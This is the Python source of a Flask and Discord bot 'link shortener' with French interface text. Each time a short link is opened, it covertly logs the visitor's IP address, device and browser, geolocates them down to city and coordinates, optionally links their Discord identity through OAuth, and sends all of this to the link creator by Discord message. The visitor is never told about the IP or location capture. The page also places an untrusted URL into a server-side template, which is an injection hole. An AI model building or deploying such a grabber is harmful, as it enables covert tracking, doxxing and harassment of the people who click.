import sqlite3
from flask import Flask, request, redirect, render_template_string, session, url_for
from flask_session import Session
from datetime import datetime
from user_agents import parse
import asyncio
from threading import Lock
import discord
import requests
import os
from dotenv import load_dotenv
import string
import random
import base64
import secrets

load_dotenv()
BASE_URL = os.getenv('BASE_URL', 'http://localhost:5001')
DISCORD_CLIENT_ID = os.getenv('DISCORD_CLIENT_ID', '')
DISCORD_CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET', '')
DISCORD_REDIRECT_URI = f'{BASE_URL}/auth/callback'

click_codes = {}

app = Flask(__name__)
app.config['SESSION_TYPE'] = 'filesystem'
app.secret_key = secrets.token_hex(32)
Session(app)
bot_instance = None
notify_lock = Lock()

def init_shortlink_db():
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_links (
            id TEXT PRIMARY KEY,
            original_url TEXT NOT NULL,
            user_id INTEGER NOT NULL,
            guild_id INTEGER NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS link_visits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_id TEXT NOT NULL,
            visitor_id INTEGER,
            visitor_name TEXT,
            ip_address TEXT,
            browser TEXT,
            device_type TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(short_id) REFERENCES custom_links(id)
        )
    ''')
    conn.commit()
    conn.close()

def get_os_info(user_agent_str):
    os_info = "Inconnu"
    if 'Windows' in user_agent_str:
        if 'Windows NT 10.0' in user_agent_str:
            os_info = "🪟 Windows 10/11"
        else:
            os_info = "🪟 Windows"
    elif 'Mac' in user_agent_str:
        os_info = "🍎 macOS"
    elif 'Linux' in user_agent_str:
        os_info = "🐧 Linux"
    elif 'Android' in user_agent_str:
        os_info = "🤖 Android"
    elif 'iPhone' in user_agent_str or 'iPad' in user_agent_str:
        os_info = "🍎 iOS"
    
    return os_info

def get_ip_info(ip_address):
    try:
        response = requests.get(f'https://ip-api.com/json/{ip_address}?lang=fr', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Inconnu'),
                    'country_code': data.get('countryCode', 'XX'),
                    'region': data.get('regionName', 'Inconnu'),
                    'city': data.get('city', 'Inconnu'),
                    'isp': data.get('isp', 'Inconnu'),
                    'org': data.get('org', 'Inconnu'),
                    'lat': data.get('lat', 'N/A'),
                    'lon': data.get('lon', 'N/A'),
                    'timezone': data.get('timezone', 'Inconnu')
                }
    except:
        pass
    
    return None

async def notify_discord_shortlink(creator_id, short_id, ip_address, browser, device_type, user_agent_str):
    if not bot_instance:
        return
    
    try:
        creator = await bot_instance.fetch_user(creator_id)
        user_agent_obj = parse(user_agent_str)
        os_info = get_os_info(user_agent_str)
        ip_info = get_ip_info(ip_address)
        
        embed = discord.Embed(
            title="✨ Quelqu'un a cliqué sur ton lien!",
            description=f"Le lien **{short_id}** a reçu une visite 👀",
            color=discord.Color.brand_green(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="🔗 ID du lien", value=f"`{short_id}`", inline=False)
        
        embed.add_field(name="💻 INFORMATIONS SYSTÈME", value="‎", inline=False)
        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
        embed.add_field(name="Système", value=os_info, inline=True)
        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
        
        embed.add_field(name="🌍 INFORMATIONS RÉSEAU", value="‎", inline=False)
        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
        
        if ip_info:
            embed.add_field(name="🗺️ Géolocalisation", value="‎", inline=False)
            embed.add_field(name="Pays", value=f"🌐 {ip_info['country']}", inline=True)
            embed.add_field(name="Région", value=f"📍 {ip_info['region']}", inline=True)
            embed.add_field(name="Ville", value=f"🏙️ {ip_info['city']}", inline=True)
            embed.add_field(name="Fuseau horaire", value=f"🕐 {ip_info['timezone']}", inline=True)
            embed.add_field(name="Coordonnées", value=f"📌 {ip_info['lat']}, {ip_info['lon']}", inline=True)
            embed.add_field(name="FAI", value=f"🔗 {ip_info['isp']}", inline=True)
            embed.add_field(name="Code Pays", value=f"💾 {ip_info['country_code']}", inline=True)
            embed.add_field(name="Organisation", value=f"🏢 {ip_info['org']}", inline=True)
        
        embed.add_field(name="📋 DÉTAILS TECHNIQUES", value="‎", inline=False)
        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
        
        embed.add_field(name="⏰ Heure du clic", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        
        embed.set_footer(text="Lien court | Détection de visite")
        
        await creator.send(embed=embed)
    except Exception as e:
        pass

async def notify_discord_shortlink_oauth(creator_id, short_id, visitor_id, visitor_name, ip_address, browser, device_type, user_agent_str):
    if not bot_instance:
        return
    
    try:
        creator = await bot_instance.fetch_user(creator_id)
        visitor = await bot_instance.fetch_user(visitor_id)
        os_info = get_os_info(user_agent_str)
        ip_info = get_ip_info(ip_address)
        
        embed = discord.Embed(
            title="✨ Quelqu'un a cliqué sur ton lien!",
            description=f"Le lien **{short_id}** a reçu une visite 👀",
            color=discord.Color.brand_green(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="🔗 ID du lien", value=f"`{short_id}`", inline=False)
        
        embed.add_field(name="👤 UTILISATEUR DISCORD", value="‎", inline=False)
        embed.add_field(name="Nom", value=f"{visitor_name}", inline=True)
        embed.add_field(name="ID", value=f"`{visitor_id}`", inline=True)
        embed.add_field(name="Mention", value=visitor.mention, inline=True)
        
        embed.add_field(name="💻 INFORMATIONS SYSTÈME", value="‎", inline=False)
        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
        embed.add_field(name="Système", value=os_info, inline=True)
        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
        
        embed.add_field(name="🌍 INFORMATIONS RÉSEAU", value="‎", inline=False)
        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
        
        if ip_info:
            embed.add_field(name="🗺️ Géolocalisation", value="‎", inline=False)
            embed.add_field(name="Pays", value=f"🌐 {ip_info['country']}", inline=True)
            embed.add_field(name="Région", value=f"📍 {ip_info['region']}", inline=True)
            embed.add_field(name="Ville", value=f"🏙️ {ip_info['city']}", inline=True)
            embed.add_field(name="Fuseau horaire", value=f"🕐 {ip_info['timezone']}", inline=True)
            embed.add_field(name="Coordonnées", value=f"📌 {ip_info['lat']}, {ip_info['lon']}", inline=True)
            embed.add_field(name="FAI", value=f"🔗 {ip_info['isp']}", inline=True)
        
        embed.add_field(name="⏰ Heure du clic", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
        
        embed.set_footer(text="Lien court | Identification Discord OAuth2")
        
        await creator.send(embed=embed)
    except Exception as e:
        pass

def generate_click_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def record_visit(short_id, visitor_id, visitor_name, ip_address, browser, device_type, user_agent_str):
    try:
        ip_info = get_ip_info(ip_address)
        country = ip_info.get('country', 'Inconnu') if ip_info else 'Inconnu'
        region = ip_info.get('region', 'Inconnu') if ip_info else 'Inconnu'
        city = ip_info.get('city', 'Inconnu') if ip_info else 'Inconnu'
        
        conn = sqlite3.connect("links.db")
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO link_visits (short_id, visitor_id, visitor_name, ip_address, browser, device_type, country, region, city)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (short_id, visitor_id, visitor_name, ip_address, browser, device_type, country, region, city))
        conn.commit()
        conn.close()
    except Exception as e:
        pass

@app.route('/auth/callback')
def auth_callback():
    code = request.args.get('code')
    if not code:
        return "Erreur: code manquant", 400
    
    if 'link_data' not in session:
        return "Erreur: session expirée", 400
    
    link_data = session['link_data']
    
    try:
        token_response = requests.post(
            'https://discord.com/api/oauth2/token',
            data={
                'client_id': DISCORD_CLIENT_ID,
                'client_secret': DISCORD_CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': DISCORD_REDIRECT_URI
            },
            timeout=5
        )
        
        if token_response.status_code != 200:
            return redirect(link_data['original_url'])
        
        token_data = token_response.json()
        access_token = token_data.get('access_token')
        
        user_response = requests.get(
            'https://discord.com/api/users/@me',
            headers={'Authorization': f'Bearer {access_token}'},
            timeout=5
        )
        
        if user_response.status_code != 200:
            return redirect(link_data['original_url'])
        
        user_data = user_response.json()
        visitor_id = int(user_data.get('id', 0))
        visitor_name = user_data.get('username', 'Unknown')
        
        record_visit(
            link_data['short_id'],
            visitor_id,
            visitor_name,
            link_data['ip_address'],
            link_data['browser'],
            link_data['device_type'],
            link_data['user_agent_str']
        )
        
        if bot_instance:
            try:
                loop = bot_instance.loop
                asyncio.run_coroutine_threadsafe(
                    notify_discord_shortlink_oauth(
                        link_data['user_id'],
                        link_data['short_id'],
                        visitor_id,
                        visitor_name,
                        link_data['ip_address'],
                        link_data['browser'],
                        link_data['device_type'],
                        link_data['user_agent_str']
                    ),
                    loop
                )
            except:
                pass
        
        del session['link_data']
        return redirect(link_data['original_url'])
    except:
        return redirect(link_data['original_url'])

@app.route('/link/<short_id>')
def shortlink_redirect(short_id):
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    user_agent_obj = parse(user_agent_str)
    
    device_type = 'Mobile' if user_agent_obj.is_mobile else ('Tablet' if user_agent_obj.is_tablet else 'Desktop')
    browser = str(user_agent_obj.browser.family)
    
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    
    conn = sqlite3.connect("links.db")
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT original_url, user_id, clicks
        FROM custom_links
        WHERE id = ?
    ''', (short_id,))
    
    result = cursor.fetchone()
    
    if result:
        original_url, user_id, clicks = result
        
        cursor.execute('''
            UPDATE custom_links
            SET clicks = clicks + 1
            WHERE id = ?
        ''', (short_id,))
        conn.commit()
        conn.close()
        
        session['link_data'] = {
            'short_id': short_id,
            'original_url': original_url,
            'user_id': user_id,
            'ip_address': ip_address,
            'browser': browser,
            'device_type': device_type,
            'user_agent_str': user_agent_str
        }
        
        oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={DISCORD_CLIENT_ID}&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify"
        
        html = f"""
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Lien Raccourci</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }}
                .container {{
                    background: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 10px 25px rgba(0,0,0,0.2);
                    text-align: center;
                    max-width: 500px;
                }}
                h1 {{
                    color: #333;
                    margin-bottom: 20px;
                }}
                p {{
                    color: #666;
                    font-size: 16px;
                    margin: 15px 0;
                }}
                .url {{
                    background: #f0f0f0;
                    padding: 15px;
                    border-radius: 5px;
                    word-break: break-all;
                    color: #667eea;
                    font-weight: bold;
                    margin: 15px 0;
                }}
                .button {{
                    background: #5865F2;
                    color: white;
                    padding: 12px 30px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 16px;
                    margin-top: 20px;
                    text-decoration: none;
                    display: inline-block;
                }}
                .button:hover {{
                    background: #4752C4;
                }}
                .skip {{
                    background: #667eea;
                    color: white;
                    padding: 10px 20px;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-size: 14px;
                    margin-top: 10px;
                    text-decoration: none;
                    display: inline-block;
                }}
                .skip:hover {{
                    background: #764ba2;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🔗 Lien Raccourci</h1>
                <p>Vous allez être redirigé vers:</p>
                <div class="url">{original_url}</div>
                
                <p style="margin: 20px 0; color: #999;">Connectez-vous avec Discord pour enregistrer votre visite</p>
                
                <a href="{oauth_url}" class="button">🔐 Continuer avec Discord</a>
                <br>
                <a href="{original_url}" class="skip">Passer cette étape</a>
            </div>
        </body>
        </html>
        """
        
        return render_template_string(html)
    
    conn.close()
    return "Lien non trouvé", 404

def run_server(bot=None):
    global bot_instance
    bot_instance = bot
    init_shortlink_db()
    app.run(host='0.0.0.0', port=5001, debug=False)
